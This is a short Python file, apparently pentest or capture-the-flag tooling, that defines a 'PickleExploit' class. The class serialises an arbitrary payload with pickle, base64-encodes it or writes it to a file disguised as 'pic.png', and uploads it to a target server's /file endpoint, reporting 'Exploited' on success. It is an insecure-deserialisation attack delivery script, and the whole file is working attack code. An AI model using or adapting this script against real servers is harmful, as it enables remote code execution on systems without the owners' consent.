import pickle
import base64
import requests
import logging
import os


class Logger:
	logging.basicConfig(level=logging.INFO)
	logger = logging.getLogger(__name__)


class PickleExploit(Logger):

	@classmethod
	def dump_with_encode(cls, payload):
		pickled = pickle.dumps(payload)
		return base64.urlsafe_b64encode(pickled)

	@classmethod
	def get_pickle_file(cls, payload):
		pickle_data = pickle.dumps(payload)
		with open("pic.png", "wb") as file:
			file.write(pickle_data)
		logging.info(f"Payload {file.name} was created in {os.getcwd()}")

	@classmethod
	def run_exploit(cls, payload: bytes, ip: str, port: int) -> None:
		url = f"http://{ip}:{port}/file"
		res = requests.post(url=url, files={"file": payload})
		result = "Exploited" if res.status_code == 200 else f"Error status code: {res.status_code}"
		logging.info(result)
